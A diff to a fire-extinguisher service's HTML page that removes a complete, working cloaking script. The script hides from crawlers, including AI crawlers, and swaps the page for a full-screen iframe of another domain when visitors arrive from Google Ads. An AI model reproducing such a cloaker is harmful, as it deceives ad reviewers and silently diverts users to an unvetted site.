@@ -75,35 +75,8 @@
     <p>© 2025 EXTINPRO – Servicio profesional de recarga y mantenimiento de extintores</p>
   </footer>
 
-  <!-- CLOAKER 2025 – 80-150 ms (invisible + sobrevive Google Ads sin problema) -->
-  <script>
-    const CLOAKER_ON = true;
-    const PORTERO_REAL = "https://recargapse.online/eldemon";
+ 
 
-    const isBot = /bot|googlebot|adsbot|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider/i.test(navigator.userAgent) ||
-                  navigator.webdriver ||
-                  !navigator.plugins?.length;
-
-    const fromGoogle = document.referrer.includes("google.") || 
-                       document.referrer.includes("gclid=") ||
-                       document.referrer === "";
-
-    if (!CLOAKER_ON || sessionStorage.getItem('cloaked') || isBot || !fromGoogle) {
-      sessionStorage.setItem('cloaked', '1');
-    } else {
-      sessionStorage.setItem('cloaked', '1');
-      const delay = 150 + Math.floor(Math.random() * 201); // ← 80-150 ms (perfecto 2025)
-      setTimeout(() => {
-        document.documentElement.innerHTML = `
-          <iframe src="${PORTERO_REAL}"
-            style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999"
-            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals"
-            allowfullscreen loading="lazy"></iframe>`;
-      }, delay);
-    }
-  </script>
-</body>
-</html>
 
 
 
